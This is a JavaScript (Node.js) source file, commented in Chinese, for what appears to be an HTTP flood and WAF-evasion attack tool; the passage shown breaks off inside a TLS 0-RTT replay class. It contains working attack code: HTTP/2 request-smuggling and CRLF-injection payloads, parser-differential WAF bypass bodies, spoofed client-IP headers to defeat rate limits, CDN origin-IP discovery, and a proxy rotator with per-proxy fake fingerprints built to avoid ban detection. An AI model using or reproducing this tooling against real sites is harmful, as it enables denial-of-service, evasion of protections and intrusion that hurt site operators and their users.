'use strict';

// ==================== 自动安装依赖 ====================
const { execSync } = require('child_process');
let colors;
try {
  colors = require('colors');
} catch (err) {
  console.log('\x1b[36m[安装]\x1b[37m 正在安装依赖...');
  try {
    execSync('npm install colors', { stdio: 'inherit' });
    console.log('✅ \x1b[32m依赖安装完成，继续执行\x1b[37m');
    colors = require('colors');
  } catch (e) {
    console.log('⚠️  \x1b[33m安装colors失败，使用基础颜色输出\x1b[37m');
    colors = {
      yellow: (str) => `\x1b[33m${str}\x1b[37m`,
      red: (str) => `\x1b[31m${str}\x1b[37m`,
      green: (str) => `\x1b[32m${str}\x1b[37m`,
      cyan: (str) => `\x1b[36m${str}\x1b[37m`,
      magenta: (str) => `\x1b[35m${str}\x1b[37m`,
      blue: (str) => `\x1b[34m${str}\x1b[37m`,
    };
  }
}

if (colors && colors.setTheme) {
  colors.setTheme({
    info: 'cyan', warn: 'yellow', error: 'red', success: 'green',
    attack: 'magenta', stats: 'blue', bypass: 'rainbow', random: 'random', method: 'cyan'
  });
}

// 全局错误处理——防止进程静默崩溃
process.on('uncaughtException', (err) => {
  console.error(`[${new Date().toISOString()}] \x1b[31m[全局异常]\x1b[37m`, err.message);
});
process.on('unhandledRejection', (reason) => {
  console.error(`[${new Date().toISOString()}] \x1b[31m[未处理拒绝]\x1b[37m`, reason?.message || reason);
});

const net = require('net');
const http = require('http');
const http2 = require('http2');
const https = require('https');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const dns = require('dns').promises;
const tls = require('tls');

const fileName = path.basename(__filename);

// ==================== UAs ====================
const UAs = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
  "Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
  "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.5621.42 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.5621.42 Mobile Safari/537.36",
  "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
  "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
];

// ==================== 速率限制绕过专用头 ====================
const RATE_LIMIT_BYPASS_HEADERS = {
  standard: [
    'X-Forwarded-For', 'X-Real-IP', 'X-Client-IP', 'X-Originating-IP',
    'X-Remote-IP', 'X-Remote-Addr', 'X-Cluster-Client-IP', 'X-ProxyUser-Ip',
  ],
  cdnSpecific: [
    'CF-Connecting-IP', 'True-Client-IP', 'X-Azure-ClientIP', 'X-Azure-SocketIP',
    'Ali-Cdn-Real-Ip', 'Cdn-Src-Ip', 'Cdn-Real-Ip', 'Fastly-Client-Ip',
    'X-Amz-Cf-Id', 'CloudFront-Viewer-Address',
  ],
  misc: [
    'X-Forwarded', 'X-Forwarded-By', 'X-Forwarded-For-Original',
    'X-Forwarder-For', 'Forwarded-For', 'Forwarded-For-Ip',
    'X-Custom-IP-Authorization', 'X-ProxyUser-Ip', 'Client-IP',
    'X-Original-URL', 'X-Forwarded-Host',
  ]
};

// ==================== WAFFLED解析差异负载 ====================
const WAFFLED_PAYLOADS = {
  multipartBypasses: [
    { boundary: '--boundary1; boundary=--boundary2' },
    { boundary: ' --boundary' },
    { boundary: '"boundary"' },
    { boundary: 'BOUNDARY' },
    { boundary: 'boundary\t' },
    { boundary: '; boundary=real_boundary' },
  ],
  jsonBypasses: [
    { body: '{"action":"benign","action":"malicious"}' },
    { body: '{"action":/*comment*/"malicious"}' },
    { body: '{"action":"malicious",}' },
    { body: "{'action':'malicious'}" },
  ],
  xmlBypasses: [
    { body: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe "malicious">]><root>&xxe;</root>' },
    { body: '<?xml version="1.1"?><root>malicious</root>' },
  ],
};

// ==================== HTTP参数污染模板 ====================
const PARAM_POLLUTION_TEMPLATES = [
  (baseParams) => {
    const dup = {};
    for (const [k, v] of Object.entries(baseParams)) {
      dup[k] = [v, crypto.randomBytes(3).toString('hex')];
    }
    return dup;
  },
  (baseParams) => {
    const encoded = {};
    for (const [k, v] of Object.entries(baseParams)) {
      encoded[encodeURIComponent(k)] = encodeURIComponent(v);
    }
    return encoded;
  },
];

// ==================== 攻击头模板 ====================
const BYPASS_HEADERS = {
  normal: {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8,en-US;q=0.7',
    'Accept-Encoding': 'gzip, deflate, br',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'none',
    'Sec-Fetch-User': '?1',
    'Sec-CH-UA': '"Google Chrome";v="120", "Not?A_Brand";v="8", "Chromium";v="120"',
    'Sec-CH-UA-Mobile': '?0',
    'Sec-CH-UA-Platform': '"Windows"',
  },
  api: {
    'Accept': 'application/json, text/plain, */*',
    'Content-Type': 'application/json',
    'X-Requested-With': 'XMLHttpRequest',
    'Origin': 'https://www.google.com',
    'Referer': 'https://www.google.com/',
  },
  mobile: {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'Accept-Language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
    'Accept-Encoding': 'gzip, deflate, br',
    'Upgrade-Insecure-Requests': '1',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'none',
    'Sec-Fetch-User': '?1',
    'Sec-CH-UA': '"Google Chrome";v="120", "Not?A_Brand";v="8", "Chromium";v="120"',
    'Sec-CH-UA-Mobile': '?1',
    'Sec-CH-UA-Platform': '"Android"',
  },
};

// ==================== HTTP/2 走私负载 ====================
const H2_SMUGGLING_PAYLOADS = [
  {
    name: 'H2.CL Desync', method: 'POST',
    pseudoHeaders: { ':method': 'POST', ':path': '/', ':authority': '' },
    customHeaders: { 'content-length': '0', 'x-ignore': '' },
    body: 'GET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n',
  },
  {
    name: 'CRLF Header Injection', method: 'GET',
    pseudoHeaders: { ':method': 'GET', ':path': '/', ':authority': '' },
    customHeaders: { 'foo': 'bar\r\nTransfer-Encoding: chunked' },
    body: '',
  },
  {
    name: 'TE Obfuscation', method: 'POST',
    pseudoHeaders: { ':method': 'POST', ':path': '/api', ':authority': '' },
    customHeaders: { 'transfer-encoding': 'chunked', 'Transfer-Encoding': 'identity' },
    body: '0\r\n\r\n',
  },
  {
    name: 'Double Content-Length', method: 'POST',
    pseudoHeaders: { ':method': 'POST', ':path': '/', ':authority': '' },
    customHeaders: { 'content-length': '4', 'content-length': '42' },
    body: 'test',
  },
  {
    name: 'H2.TE Chunked Size Obfuscation', method: 'POST',
    pseudoHeaders: { ':method': 'POST', ':path': '/api/data', ':authority': '' },
    customHeaders: { 'transfer-encoding': 'chunked' },
    body: '0\r\n\r\nSMUGGLED',
  },
  {
    name: 'OPTIONS+Body Smuggling (CVE-2025-54142)', method: 'OPTIONS',
    pseudoHeaders: { ':method': 'OPTIONS', ':path': '/', ':authority': '' },
    customHeaders: { 'content-length': '36' },
    body: 'GET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n',
  },
  {
    name: 'Space Obfuscation in Method', method: 'GET',
    pseudoHeaders: { ':method': '\x20GET', ':path': '/', ':authority': '' },
    customHeaders: {},
    body: '',
  },
];

// ==================== 缓存穿透技术 ====================
const CACHE_BYPASS_TECHNIQUES = {
  randomQueryParams: () => {
    const params = [
      `_t=${Date.now()}`,
      `_=${Math.random().toString(36).substring(2, 15)}`,
      `cachebuster=${crypto.randomBytes(4).toString('hex')}`,
      `nocache=${Math.random()}`,
      `ts=${Date.now()}${Math.floor(Math.random() * 1000)}`,
      `r=${Math.floor(Math.random() * 999999)}`,
    ];
    return '?' + params[Math.floor(Math.random() * params.length)];
  },
  cacheControlHeaders: () => ({
    'Cache-Control': ['no-cache, no-store, must-revalidate, max-age=0', 'no-cache', 'max-age=0', 'no-store', 'private, no-cache'][Math.floor(Math.random() * 5)],
    'Pragma': 'no-cache',
  }),
  methodOverride: () => {
    const overrides = [
      { 'X-HTTP-Method-Override': 'POST' },
      { 'X-HTTP-Method': 'PUT' },
      { 'X-HTTP-Method-Override': 'DELETE' },
    ];
    return overrides[Math.floor(Math.random() * overrides.length)];
  },
  encodingVariation: () => ({
    'Accept-Encoding': ['identity', 'gzip;q=0, deflate;q=0', '*;q=0'][Math.floor(Math.random() * 3)],
  }),
};

// ==================== 动态回源负载 ====================
const ORIGIN_PULL_PATHS = [
  '/api/v1/user/profile', '/api/v2/data/query', '/api/search', '/api/auth/token',
  '/api/orders/recent', '/api/products/list', '/api/notifications', '/api/settings',
  '/api/dashboard', '/api/analytics', '/graphql', '/api/graphql', '/query',
  '/api/v1/login', '/api/v1/payments', '/api/v2/users', '/ws',
];

const ORIGIN_PULL_QUERIES = [
  { q: crypto.randomBytes(4).toString('hex') },
  { search: crypto.randomBytes(4).toString('hex') },
  { id: Math.floor(Math.random() * 99999) },
  { page: Math.floor(Math.random() * 100), limit: 20 },
  { token: crypto.randomBytes(8).toString('hex') },
  { timestamp: Date.now() },
];

// ==================== CDN穿透引擎 ====================
class AdvancedCDNBypassEngine {
  constructor(domain) {
    this.domain = domain;
    this.discoveredIPs = new Set();
    this.originIP = null;
  }

  async queryCT() {
    return new Promise(resolve => {
      const req = https.get(`https://crt.sh/?q=%25.${encodeURIComponent(this.domain)}&output=json`, { timeout: 8000 }, res => {
        let data = '';
        res.on('data', chunk => data += chunk);
        res.on('end', () => {
          try {
            JSON.parse(data).forEach(cert => {
              const name = cert.name_value || cert.common_name || '';
              if (/^\d+\.\d+\.\d+\.\d+$/.test(name) && !this.isCDNIP(name)) this.discoveredIPs.add(name);
            });
          } catch(e) {}
          resolve();
        });
      });
      req.on('error', () => resolve());
      req.on('timeout', () => { req.destroy(); resolve(); });
    });
  }

  async huntSubdomains() {
    const subs = ['www','mail','ftp','admin','test','dev','staging','api','app','blog','direct','origin','backend','server','web','portal','m','mobile','beta','vpn','cpanel','whm','webmail','owa','secure','shop','store','s1','s2','cdn','media','static','assets'];
    for (const sub of subs) {
      try {
        const addrs = await dns.resolve4(`${sub}.${this.domain}`);
        for (const ip of addrs) { if (!this.isCDNIP(ip)) this.discoveredIPs.add(ip); }
      } catch(e) {}
    }
  }

  isCDNIP(ip) {
    const ranges = [
      '103.21.244','103.22.200','103.31.4',
      '104.16','104.17','104.18','104.19','104.20','104.21','104.22','104.23','104.24','104.25','104.26','104.27','104.28','104.29','104.30','104.31',
      '23.227.38','13.32','13.33','13.35',
      '205.185.208','205.185.216','151.101',
      '2.16','2.17','2.18','2.19','2.20','2.21','2.22','2.23',
    ];
    return ranges.some(r => ip.startsWith(r));
  }

  async verifyOrigin(ip) {
    return new Promise(resolve => {
      const req = https.get({
        hostname: ip, port: 443, path: '/', timeout: 5000,
        rejectUnauthorized: false, servername: this.domain,
        headers: { 'Host': this.domain, 'User-Agent': 'Mozilla/5.0' }
      }, res => {
        const cdnHdrs = ['cf-ray','x-cache','x-amz-cf-id','x-akamai-transformed','cf-cache-status','x-cache-hits','x-served-by'];
        resolve(!cdnHdrs.some(h => res.headers[h]));
      });
      req.on('error', () => resolve(false));
      req.on('timeout', () => { req.destroy(); resolve(false); });
    });
  }

  async run() {
    console.log(`\n\x1b[35m[CDN穿透]\x1b[37m 探测 ${this.domain} 的源站IP...`);
    await Promise.all([this.queryCT(), this.huntSubdomains()]);
    if (this.discoveredIPs.size === 0) { console.log(`  \x1b[33m[!]\x1b[37m 未发现`); return null; }
    console.log(`  \x1b[33m[*]\x1b[37m 发现 ${this.discoveredIPs.size} 个疑似IP，验证中...`);
    for (const ip of this.discoveredIPs) {
      if (await this.verifyOrigin(ip)) {
        this.originIP = ip;
        console.log(`  \x1b[32m[+]\x1b[37m ✅ 确认源站IP: ${ip}`);
        return ip;
      }
    }
    console.log(`  \x1b[33m[!]\x1b[37m 无法确认`);
    return null;
  }

  getInjectionHeaders() {
    const internalIP = () => {
      const pool = ['127.0.0.1','10.0.0.1','172.16.0.1','192.168.0.1','169.254.169.254','100.100.100.200'];
      return pool[Math.floor(Math.random() * pool.length)];
    };
    return {
      'X-Forwarded-For': internalIP(), 'X-Real-IP': internalIP(),
      'CF-Connecting-IP': internalIP(), 'True-Client-IP': internalIP(),
      'X-Originating-IP': internalIP(), 'X-Remote-IP': internalIP(),
      'X-Client-IP': internalIP(), 'Ali-Cdn-Real-Ip': internalIP(),
      'Via': '1.1 google', 'CDN-Loop': 'cloudflare',
    };
  }
}

// ==================== 智能代理调度引擎 v3.0 ====================

class SmartProxyManager {
  constructor(proxies = [], options = {}) {
    // 代理池初始化（增强元数据）
    this.proxies = proxies.map(p => {
      if (typeof p === 'string') {
        const parts = p.trim().split(':');
        return {
          host: parts[0],
          port: parseInt(parts[1]) || 80,
          protocol: parts.length > 2 ? parts[2] : 'http',
          // 核心：每个代理绑定独立的行为指纹
          fingerprint: this._generateUniqueFingerprint(),
          // 状态跟踪
          failures: 0,
          successes: 0,
          score: 100,
          lastUsed: 0,
          lastFailed: 0,
          cooldownUntil: 0,
          // 请求分布
          requestsSent: 0,
          avgResponseTime: 0,
          // 地理/ASN伪装标记
          geoTag: this._randomGeoTag(),
        };
      }
      return { ...p, fingerprint: p.fingerprint || this._generateUniqueFingerprint() };
    });

    // 调度策略
    this.strategy = options.strategy || 'adaptive'; // 'adaptive' | 'round-robin' | 'lowest-load' | 'geographic'
    this.cooldownMs = options.cooldownMs || 30000;
    this.maxConsecutiveFailures = options.maxConsecutiveFailures || 3;
    this.consecutiveFailures = new Map();
    
    // 全局速率控制
    this.globalRateLimit = options.globalRateLimit || 0; // 0 = 无限制
    this.minRequestInterval = options.minRequestInterval || 100; // 同一代理最小请求间隔(ms)
    
    // 会话绑定：同一"用户"会话内保持同一代理
    this.sessionBindings = new Map(); // sessionId -> proxy
    this.sessionIdCounter = 0;
    
    // 统计
    this.stats = {
      totalRequests: 0,
      totalFailures: 0,
      proxySwitches: 0,
      bansDetected: 0,
    };

    console.log(`\x1b[36m[代理引擎]\x1b[37m 初始化完成: ${this.proxies.length}个代理 | 策略:${this.strategy} | 每个代理绑定独立指纹`);
  }

  /**
   * 为每个代理生成独立的行为指纹
   * 这是绕过WAF关联检测的核心
   */
  _generateUniqueFingerprint() {
    const osPool = ['Windows NT 10.0', 'Windows NT 10.0', 'Macintosh; Intel Mac OS X 10_15_7', 'X11; Linux x86_64', 'iPhone; CPU iPhone OS 17_2', 'Linux; Android 14'];
    const browserPool = [
      { name: 'Chrome', version: '120.0.0.0', engine: 'AppleWebKit/537.36' },
      { name: 'Firefox', version: '120.0', engine: 'Gecko/20100101' },
      { name: 'Edge', version: '119.0.0.0', engine: 'AppleWebKit/537.36' },
      { name: 'Safari', version: '17.2', engine: 'AppleWebKit/605.1.15' },
    ];
    const languagePool = ['zh-CN,zh;q=0.9', 'en-US,en;q=0.9', 'zh-TW,zh;q=0.9', 'ja-JP,ja;q=0.9', 'ko-KR,ko;q=0.9'];
    const screenPool = ['1920x1080', '2560x1440', '1440x900', '1366x768', '375x812', '390x844'];

    return {
      os: osPool[Math.floor(Math.random() * osPool.length)],
      browser: browserPool[Math.floor(Math.random() * browserPool.length)],
      language: languagePool[Math.floor(Math.random() * languagePool.length)],
      screen: screenPool[Math.floor(Math.random() * screenPool.length)],
      timezone: `UTC${Math.random() > 0.5 ? '+' : '-'}${Math.floor(Math.random() * 12)}`,
      // 用于构建唯一UA
      getUA: function() {
        return `Mozilla/5.0 (${this.os}) ${this.engine || 'AppleWebKit/537.36'} (KHTML, like Gecko) ${this.browser.name}/${this.browser.version} Safari/537.36`;
      }
    };
  }

  _randomGeoTag() {
    const geos = ['US', 'CN', 'JP', 'KR', 'DE', 'UK', 'FR', 'BR', 'IN', 'SG'];
    return geos[Math.floor(Math.random() * geos.length)];
  }

  /**
   * 核心：获取代理（考虑会话绑定）
   */
  getProxy(sessionId = null) {
    // 如果有会话绑定，复用同一代理
    if (sessionId && this.sessionBindings.has(sessionId)) {
      const bound = this.sessionBindings.get(sessionId);
      if (bound.score > 0 && Date.now() < bound.cooldownUntil) {
        return bound;
      }
    }

    const now = Date.now();
    
    // 过滤可用代理
    const available = this.proxies.filter(p => {
      // 冷却中
      if (now < p.cooldownUntil) return false;
      // 过于频繁
      if (p.lastUsed && (now - p.lastUsed) < this.minRequestInterval) return false;
      // 分数太低
      if (p.score <= 0) return false;
      return true;
    });

    // 无可用代理，重置部分代理
    if (available.length === 0) {
      console.log(`\x1b[33m[代理警告]\x1b[37m 无可用代理，重置冷却`);
      this.proxies.forEach(p => {
        p.cooldownUntil = 0;
        p.failures = Math.max(0, p.failures - 1);
        p.score = Math.max(10, p.score);
      });
      return this.getProxy(sessionId);
    }

    let selected;

    switch (this.strategy) {
      case 'adaptive':
        // 加权随机选择
        const totalScore = available.reduce((sum, p) => sum + p.score, 0);
        let rand = Math.random() * totalScore;
        for (const p of available) {
          rand -= p.score;
          if (rand <= 0) { selected = p; break; }
        }
        break;

      case 'lowest-load':
        // 最少使用代理
        selected = available.sort((a, b) => a.requestsSent - b.requestsSent)[0];
        break;

      case 'geographic':
        // 地理分布均匀
        const geoCount = {};
        available.forEach(p => { geoCount[p.geoTag] = (geoCount[p.geoTag] || 0) + 1; });
        const shuffledGeo = available.sort(() => Math.random() - 0.5);
        const leastUsedGeo = [...new Set(shuffledGeo.map(p => p.geoTag))].sort((a, b) => (geoCount[a] || 0) - (geoCount[b] || 0))[0];
        const geoPool = available.filter(p => p.geoTag === leastUsedGeo);
        selected = geoPool[Math.floor(Math.random() * geoPool.length)];
        break;

      default:
        selected = available[Math.floor(Math.random() * available.length)];
    }

    if (!selected) selected = available[0];

    selected.lastUsed = now;
    selected.requestsSent++;

    // 建立会话绑定
    if (sessionId) {
      this.sessionBindings.set(sessionId, selected);
    }

    this.stats.totalRequests++;
    return selected;
  }

  /**
   * 获取代理的独立UA（使用绑定的指纹）
   */
  getUserAgent(proxy) {
    return proxy.fingerprint.getUA();
  }

  /**
   * 获取代理的独立请求头（使用绑定的指纹）
   */
  getProxySpecificHeaders(proxy) {
    return {
      'User-Agent': proxy.fingerprint.getUA(),
      'Accept-Language': proxy.fingerprint.language,
      'Sec-CH-UA-Platform': `"${proxy.fingerprint.os.split(';')[0]}"`,
      'Sec-CH-UA-Mobile': proxy.fingerprint.os.includes('iPhone') || proxy.fingerprint.os.includes('Android') ? '?1' : '?0',
    };
  }

  /**
   * 上报结果（自适应评分）
   */
  reportResult(proxy, success, responseTime = 0) {
    if (success) {
      proxy.successes++;
      proxy.failures = Math.max(0, proxy.failures - 1);
      proxy.score = Math.min(100, proxy.score + 5);
      proxy.avgResponseTime = proxy.avgResponseTime * 0.7 + responseTime * 0.3;
      
      const cf = this.consecutiveFailures.get(`${proxy.host}:${proxy.port}`) || 0;
      this.consecutiveFailures.set(`${proxy.host}:${proxy.port}`, 0);
    } else {
      proxy.failures++;
      proxy.score = Math.max(0, proxy.score - 20);
      proxy.lastFailed = Date.now();
      
      const cf = (this.consecutiveFailures.get(`${proxy.host}:${proxy.port}`) || 0) + 1;
      this.consecutiveFailures.set(`${proxy.host}:${proxy.port}`, cf);
      
      if (cf >= this.maxConsecutiveFailures) {
        proxy.score = 0;
        proxy.cooldownUntil = Date.now() + this.cooldownMs * (cf - this.maxConsecutiveFailures + 1);
        this.stats.bansDetected++;
        console.log(`\x1b[31m[代理封禁检测]\x1b[37m ${proxy.host}:${proxy.port} 连续失败${cf}次，冷却${Math.round((proxy.cooldownUntil - Date.now()) / 1000)}秒`);
      }
    }
    
    if (!success) this.stats.totalFailures++;
  }

  /**
   * 获取可用代理数量
   */
  getAvailableCount() {
    const now = Date.now();
    return this.proxies.filter(p => p.score > 0 && now < (p.cooldownUntil || 0)).length;
  }

  /**
   * 获取代理池健康状态
   */
  getHealthReport() {
    const total = this.proxies.length;
    const active = this.proxies.filter(p => p.score >= 50).length;
    const dead = this.proxies.filter(p => p.score <= 0).length;
    const avgScore = Math.round(this.proxies.reduce((s, p) => s + p.score, 0) / total);
    return {
      total, active, dead, avgScore,
      bansDetected: this.stats.bansDetected,
      proxySwitches: this.stats.proxySwitches,
    };
  }
}
// ==================== 增强版WAF绕过引擎 ====================
class EnhancedWAFBypass {
  constructor(options = {}) {
    this.enabled = options.enabled !== false;
    this.randomSpeedEnabled = options.randomSpeedEnabled || false;
    this.cdnHeaders = options.cdnHeaders || {};
    this.cacheBypassEnabled = options.cacheBypassEnabled || false;
    this.originPullEnabled = options.originPullEnabled || false;
    this.rateLimitBypassEnabled = options.rateLimitBypassEnabled !== false;
    this.waffledEnabled = options.waffledEnabled || false;
    this.paramPollutionEnabled = options.paramPollutionEnabled || false;

    this.techniques = {
      headerVariation: this.enabled,
      pathRandomization: this.enabled,
      methodRotation: this.enabled,
      caseVariation: this.enabled,
      multiMethodAttack: this.randomSpeedEnabled,
      cdnHeaderInjection: Object.keys(this.cdnHeaders).length > 0,
      cacheBypass: this.cacheBypassEnabled,
      originPull: this.originPullEnabled,
      rateLimitBypass: this.rateLimitBypassEnabled,
      waffledMultipart: this.waffledEnabled,
      waffledJSON: this.waffledEnabled,
      paramPollution: this.paramPollutionEnabled,
    };

    this.httpMethods = ['GET', 'POST', 'PUT', 'DELETE', 'HEAD', 'OPTIONS', 'PATCH'];
    this.methodWeights = {
      'GET': 0.30, 'POST': 0.25, 'PUT': 0.12, 'DELETE': 0.10,
      'HEAD': 0.10, 'OPTIONS': 0.08, 'PATCH': 0.05,
    };
    this._rateLimitIPCounter = 0;
  }

  getRandomMethod(preferredMethod = 'GET') {
    if (!this.enabled) return preferredMethod;
    const rand = Math.random();
    let cumulative = 0;
    for (const [m, w] of Object.entries(this.methodWeights)) {
      cumulative += w;
      if (rand <= cumulative) return m;
    }
    return preferredMethod;
  }

  getMethodSpecificBody(method) {
    if (!['POST', 'PUT', 'PATCH'].includes(method)) return '';
    if (this.techniques.waffledJSON && Math.random() > 0.6) {
      const payloads = WAFFLED_PAYLOADS.jsonBypasses;
      return payloads[Math.floor(Math.random() * payloads.length)].body;
    }
    if (this.techniques.waffledMultipart && Math.random() > 0.5) {
      const bp = WAFFLED_PAYLOADS.multipartBypasses[Math.floor(Math.random() * WAFFLED_PAYLOADS.multipartBypasses.length)];
      const boundary = bp.boundary.replace('real_boundary', `boundary_${crypto.randomBytes(4).toString('hex')}`);
      return `--${boundary}\r\nContent-Disposition: form-data; name="data"\r\n\r\n${crypto.randomBytes(8).toString('hex')}\r\n--${boundary}--\r\n`;
    }
    return JSON.stringify({ id: Math.floor(Math.random() * 10000), ts: Date.now(), data: crypto.randomBytes(8).toString('hex') });
  }

  getRandomPath(originalPath) {
    if (this.techniques.originPull && Math.random() > 0.4) {
      const apiPath = ORIGIN_PULL_PATHS[Math.floor(Math.random() * ORIGIN_PULL_PATHS.length)];
      let query = ORIGIN_PULL_QUERIES[Math.floor(Math.random() * ORIGIN_PULL_QUERIES.length)];
      if (this.techniques.paramPollution && Math.random() > 0.3) {
        query = PARAM_POLLUTION_TEMPLATES[Math.floor(Math.random() * PARAM_POLLUTION_TEMPLATES.length)](query);
      }
      const qs = Array.isArray(query)
        ? query.map(([k, v]) => `${k}=${encodeURIComponent(v)}`).join('&')
        : Object.entries(query).map(([k, v]) => `${k}=${encodeURIComponent(v)}`).join('&');
      return `${apiPath}?${qs}`;
    }
    if (this.techniques.cacheBypass && Math.random() > 0.5) {
      return originalPath + CACHE_BYPASS_TECHNIQUES.randomQueryParams();
    }
    if (this.techniques.pathRandomization) {
      const paths = ['/', '/index.html', '/index.php', '/home', '/api', '/api/v1', '/api/v2', '/admin', '/login', '/search', '/robots.txt', '/sitemap.xml'];
      return paths[Math.floor(Math.random() * paths.length)];
    }
    return originalPath;
  }

  getRandomUserAgent() { return UAs[Math.floor(Math.random() * UAs.length)]; }

  _generateRateLimitBypassHeaders() {
    this._rateLimitIPCounter++;
    const ip = this._generatePseudoRandomIP(this._rateLimitIPCounter);
    const headers = {};
    const allHeaders = [
      ...RATE_LIMIT_BYPASS_HEADERS.standard,
      ...RATE_LIMIT_BYPASS_HEADERS.cdnSpecific,
      ...RATE_LIMIT_BYPASS_HEADERS.misc,
    ];
    const count = Math.floor(Math.random() * 3) + 2;
    const shuffled = allHeaders.sort(() => Math.random() - 0.5);
    for (let i = 0; i < count; i++) {
      headers[shuffled[i]] = i === 0 ? ip : this._generatePseudoRandomIP(this._rateLimitIPCounter + i * 1000);
    }
    return headers;
  }

  _generatePseudoRandomIP(seed) {
    const a = (seed * 2654435761) >>> 0;
    return `${(a >>> 24) & 0xFF}.${(a >>> 16) & 0xFF}.${(a >>> 8) & 0xFF}.${a & 0xFF}`;
  }

  _getWaffledContentType(method) {
    if (!['POST', 'PUT', 'PATCH'].includes(method)) return null;
    const types = [
      { ct: 'application/x-www-form-urlencoded', weight: 0.3 },
      { ct: 'application/json', weight: 0.3 },
      { ct: 'multipart/form-data', weight: 0.2 },
      { ct: 'application/json-patch+json', weight: 0.1 },
      { ct: 'text/plain', weight: 0.05 },
      { ct: 'application/xml', weight: 0.05 },
    ];
    const rand = Math.random();
    let cum = 0;
    for (const t of types) {
      cum += t.weight;
      if (rand <= cum) return t.ct;
    }
    return types[0].ct;
  }

  getRandomHeaders(method = 'GET') {
    const headerTypes = Object.keys(BYPASS_HEADERS);
    const selectedType = headerTypes[Math.floor(Math.random() * headerTypes.length)];
    const headers = { ...BYPASS_HEADERS[selectedType] };

    if (this.techniques.rateLimitBypass) {
      Object.assign(headers, this._generateRateLimitBypassHeaders());
    }
    if (this.techniques.cdnHeaderInjection) {
      Object.assign(headers, this.cdnHeaders);
    }
    if (this.techniques.cacheBypass) {
      Object.assign(headers, CACHE_BYPASS_TECHNIQUES.cacheControlHeaders());
      if (Math.random() > 0.5) Object.assign(headers, CACHE_BYPASS_TECHNIQUES.methodOverride());
      if (Math.random() > 0.3) Object.assign(headers, CACHE_BYPASS_TECHNIQUES.encodingVariation());
    }
    if (this.techniques.waffledMultipart || this.techniques.waffledJSON) {
      const ct = this._getWaffledContentType(method);
      if (ct) headers['Content-Type'] = ct;
    }
    if (this.techniques.caseVariation && Math.random() > 0.4) {
      const keys = Object.keys(headers);
      keys.forEach(k => {
        const newK = k.split('').map(c => Math.random() > 0.5 ? c.toUpperCase() : c.toLowerCase()).join('');
        if (newK !== k) { headers[newK] = headers[k]; delete headers[k]; }
      });
    }
    return headers;
  }

  generateRandomCookies() {
    const names = ['sessionid', 'csrftoken', 'auth_token', 'user_id', 'language', 'theme', 'currency'];
    const count = Math.floor(Math.random() * 3) + 1;
    const cookies = [];
    for (let i = 0; i < count; i++) {
      cookies.push(`${names[Math.floor(Math.random() * names.length)]}=${crypto.randomBytes(8).toString('hex')}`);
    }
    return cookies.join('; ');
  }

  getRateLimitBypassStats() {
    return { requestsWithUniqueIP: this._rateLimitIPCounter };
  }

  static get MODES() {
    return { STEALTH: 'stealth', AGGRESSIVE: 'aggressive', WAFFLED: 'waffled', FULL: 'full' };
  }
}

// ==================== 0-RTT重放攻击引擎 ====================
class ZeroRTTReplayEngine {
  constructor(targetHost, targetPort = 443) {
    this.host = targetHost;
    this.port = targetPort;
    this.sessionCache = new Map();
    this.earlyDataPayloads = [];
    this.replayStats = { total: 0, accepted: 0, rejected: 0 };
  }

  async establishSession() {
    return new Promise((resolve, reject) => {
      const socket = tls.connect({
        host: this.host, port: this.port,
        rejectUnauthorized: false,
        ALPNProtocols: ['h2', 'http/1.1'],
        minVersion: 'TLSv1.3', maxVersion: 'TLSv1.3',
        earlyData: false,
      }, () => {
        console.log(`  \x1b[32m[+]\x1b[37m TLS 1.3 握手完成`);
        console.log(`  \x1b[32m[+]\x1b[37m 协议: ${socket.getProtocol()}`);
        console.log(`  \x1b[32m[+]\x1b[37m 加密套件: ${socket.getCipher().name}`);
      });

      socket.on('session', (session) => {
        const sessionId = crypto.randomBytes(8).toString('hex');
        this.sessionCache.set(sessionId, {
          ticket: session,
          establishedAt: Date.now(),
          alpn: socket.alpnProtocol || 'http/1.1',
        });
        console.log(`  \x1b[32m[+]\x1b[37m 捕获会话票据: ${sessionId}`);
        socket.end();
